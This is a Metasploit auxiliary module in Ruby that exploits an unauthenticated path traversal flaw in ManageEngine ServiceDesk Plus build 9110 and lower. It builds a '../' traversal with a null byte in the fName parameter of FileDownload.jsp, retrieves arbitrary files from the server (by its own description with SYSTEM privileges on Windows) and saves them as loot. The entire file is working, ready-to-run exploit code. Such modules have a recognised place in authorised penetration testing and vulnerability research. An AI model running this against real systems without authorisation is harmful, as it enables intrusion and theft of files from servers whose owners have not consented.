##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ManageEngine ServiceDesk Plus Path Traversal",
      'Description'    => %q{
        This module exploits an unauthenticated path traversal vulnerability found in ManageEngine
        ServiceDesk Plus build 9110 and lower. The module will retrieve any file on the filesystem
        with the same privileges as Support Center Plus is running. On Windows, files can be retrieved
        with SYSTEM privileges. The issue has been resolved in ServiceDesk Plus build 91111 (issue SD-60283).
      },
      'License'        => MSF_LICENSE,
      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
      'References'     =>
        [
          ['URL', 'https://www.manageengine.com/products/service-desk/readme-9.1.html'],
        ],
      'DisclosureDate' => "Oct 03 2015"
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),
        OptString.new('TARGETURI', [true, 'The base path to the ServiceDesk Plus installation', '/']),
        OptString.new('FILE', [true, 'The file to retrieve', '/windows/win.ini'])
      ])
  end

  def run_host(ip)
    uri = target_uri.path
    traversal = "../" * datastore['DEPTH']
    filename = datastore['FILE']
    filename = filename[1, filename.length] if filename =~ /^\//

    vprint_status("Retrieving file #{datastore['FILE']}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "workorder", "FileDownload.jsp"),
      'vars_get' =>
      {
        'module' => 'support',
        'fName' => "#{traversal}#{filename}\x00",
      }
    })

    # If we don't get a 200 when we request our malicious payload, we suspect
    # we don't have retrieved the file either. Print the status code for debugging purposes.
    # The "The File was not found" string is returned on a vulnerable environment but the file is not found.
    # The "Loding domain list To login AD authentication or local Authentication" string is returned in the response on a fixed version (build 9111)
    if res && res.code == 200
      if res.body =~ /The File was not found/
        vprint_error("Vulnerable server, but the file does not exist!")
      elsif res.body =~ /Loding domain list To login AD authentication or local Authentication/
        vprint_error("The installed version of ManageEngine ServiceDesk Plus is not vulnerable!")
      else
        p = store_loot(
          'manageengine.servicedeskplus',
          'application/octet-stream',
          ip,
          res.body,
          filename
        )
        print_good("File saved in: #{p}")
      end
    else
        vprint_error("Connection timed out")
    end
  end
end

